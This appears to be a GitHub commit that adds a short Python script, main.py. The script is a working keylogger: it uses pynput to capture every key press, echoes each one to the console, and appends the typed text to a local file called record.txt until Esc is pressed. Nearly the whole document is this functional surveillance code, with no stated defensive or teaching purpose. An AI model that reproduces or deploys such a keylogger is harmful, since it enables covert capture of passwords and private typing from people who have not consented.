8abed6718057fc5a9608db64a78dde9b70d4c9b0
Vivek Suman <37651930+vive393@users.noreply.github.com>
2021-11-09 12:23:55 +0530

    Add files via upload

---
+++ main.py
@@ -0,0 +1,39 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+    if(count >= 1):  # recording keys every at every key presses to avoid loss
+        count = 0 #reset
+        write_to_file(keys)
+        keys = [] #reset
+
+# end recording
+def release(key):
+    if key == Key.esc:
+        return False
+
+# function that writes all the keys pressed to a txt file
+def write_to_file(keys):
+    with open("record.txt", "a") as file:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k == "Key.backspace":
+                file.write("<deleted>")
+            elif k.find("space") > 0: #every word in new line
+                file.write('\n')
+            elif k == "Key.tab":
+                file.write("\n")
+            elif k.find("Key") == -1:
+                file.write(k)
+            #file.write(str(key))
+
+#listener loop to listen to all keys pressed
+with Listener(on_press = press, on_release = release) as listener:
+    listener.join()
